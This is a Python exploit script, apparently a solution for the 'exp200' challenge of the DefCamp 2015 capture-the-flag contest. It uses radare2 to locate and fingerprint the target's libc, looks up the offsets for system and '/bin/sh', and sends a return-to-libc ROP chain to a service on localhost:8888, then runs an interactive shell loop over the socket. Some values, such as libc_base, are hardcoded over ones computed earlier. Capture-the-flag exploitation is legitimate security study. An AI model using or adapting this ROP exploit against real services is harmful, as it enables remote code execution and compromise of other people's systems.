from tinydb import TinyDB, Query
import r2pipe
import hashlib
from subprocess import check_output
import struct
import socket

def rop(*args):
    return struct.pack('<Q'*len(args), *args)

def get_pid(name):
    return check_output(["pidof",name])

r = r2pipe.open('../exp200_defcamp2015_da61746febd7112be5b04437f6f17f5f0c37c384', ['-d'])
r.cmd('db main')  # break on main
r.cmd('dc')       # run!

libc_base = 0
libc_end = 0
libc_path = ''
for _map in r.cmdj('dmj'):
    if 'libc' in _map['file']:
        libc_base = _map['addr']
        libc_end = _map['addr_end']
        libc_path = _map['file']
        break  # we want the first (lowest) address

print('[+] libc is %s' % libc_path)

r = r2pipe.open(libc_path)
hash_value=r.cmd("e file.sha1")
print('[+] libc sha1 %s' % hash_value)

db = TinyDB('fingerprints/db.json')
table = db.table('hashes')
Hash = Query()
result = table.search(Hash.hash == hash_value)
libc_id = result[0]['lib']
print('[+] libc fingerprint found -> id %s' % libc_id)

table = db.table('offsets')
Offsets = Query()
result = table.search(Offsets.lib == libc_id)
print('[+] libc start %s' % result[0]['__libc_start_main_ret'])
print('[+] libc system %s' % result[0]['system'])
print('[+] libc read %s' % result[0]['read'])
print('[+] libc write %s' % result[0]['write'])
print('[+] libc bin sh offsets %s' % result[0]['str_bin_sh'])

p_pid = get_pid("rarun2").strip()
with open('/proc/' + p_pid + '/maps') as f:
    content = f.readlines()
content = [x.strip() for x in content]
libc_start_addr = 0
for line in content:
    elements = line.split(' ')
    if (libc_path in elements) and (elements[1] == 'r-xp'):
        libc_addresses = elements[0].split('-')
        libc_start_addr = libc_addresses[0]

diff = int('0x7ffff72bd000', 16) - int(libc_start_addr, 16)

popret  = 0x0000004006a3
pop2ret = 0x0000004006a1

libc_base = '0x7ffff79e4000'
binsh = int(libc_base,16) + int(result[0]['str_bin_sh'],16)
system = int(libc_base,16) + int(result[0]['system'],16)

s = socket.create_connection(('localhost', 8888))

ropp = ("%s%s%s%s%s\n") % (rop(pop2ret) , 'A'*8*2, rop(popret), rop(binsh), rop(system))

print(ropp)

s.send(ropp)

while True:
    s.send(raw_input('> ') + '\n')
    print(s.recv(1024))
